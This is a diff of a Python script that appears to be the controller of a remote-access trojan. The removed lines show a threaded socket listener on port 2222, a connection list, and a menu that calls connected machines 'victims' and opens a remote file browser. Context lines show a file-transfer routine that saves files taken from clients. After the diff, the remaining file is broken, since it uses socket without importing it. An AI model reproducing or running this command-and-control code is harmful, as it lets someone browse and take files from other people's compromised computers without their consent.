@@ -1,32 +1,11 @@
 #!/usr/bin/python3
-import socket
-import threading
-import sys
-import os
 import uuid
 
 HOST = socket.gethostname()
 PORT = 2222
 
 
-def close_connections():
-
-    with locking:
-        for each in connections:
-            each[0].shutdown(2)
-            each[0].close()
-
-
-def accept_connections():
-
-    while True:
-        socket, addr = s.accept()
-        with locking:
-            connections.append([socket, addr])
-
-
 def file_transfer(client):
-
     name = uuid.uuid4().hex
     f = open("received/" + name, 'wb')
 
@@ -67,64 +46,10 @@ def file_browser(client):
             print(received)
 
 
-def refresh_connections(locking, connections):
 
-    index = 0
-    print("-----------------------------------")
-    with locking:
-        for each in connections:
-            each[0].sendall(bytes("2", "UTF-8"))
-            data = each[0].recv(1024)
-            if (data):
-                print("| %d)%s %10s" % (index, each[1], "|"))
-                index += 1
-            else:
-                connections.remove(each)
-    print("-----------------------------------")
 
 
 def main():
-
-    accept_thread = threading.Thread(target=accept_connections, daemon=True)
-    accept_thread.start()
-
-    while True:
-        print("Items to do:\n")
-        print("1) Refresh connections.")
-        print("2) Inspect a victim.")
-        print("0) Exit.\n")
-
-        option = input("What u want to do? ")
-
-        if option == "1":
-            os.system('clear')
-            refresh_connections(locking, connections)
-
-        elif option == "2":
-            client_id = input("Choose wisely: ")
-            os.system('clear')
-            with locking:
-                try:
-                    client = connections[int(client_id)]
-                    file_browser(client)
-                except IndexError:
-                    print("Index does not exist. \n")
-        elif option == "0":
-            close_connections()
-            sys.exit(0)
-        else:
-            print("\nPerhaps you better start from the beginning.")
-            input("")
-            os.system("clear")
-
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind((HOST, PORT))
-s.listen(5)
-
-locking = threading.Lock()
-connections = []
 
 
 if __name__ == "__main__":
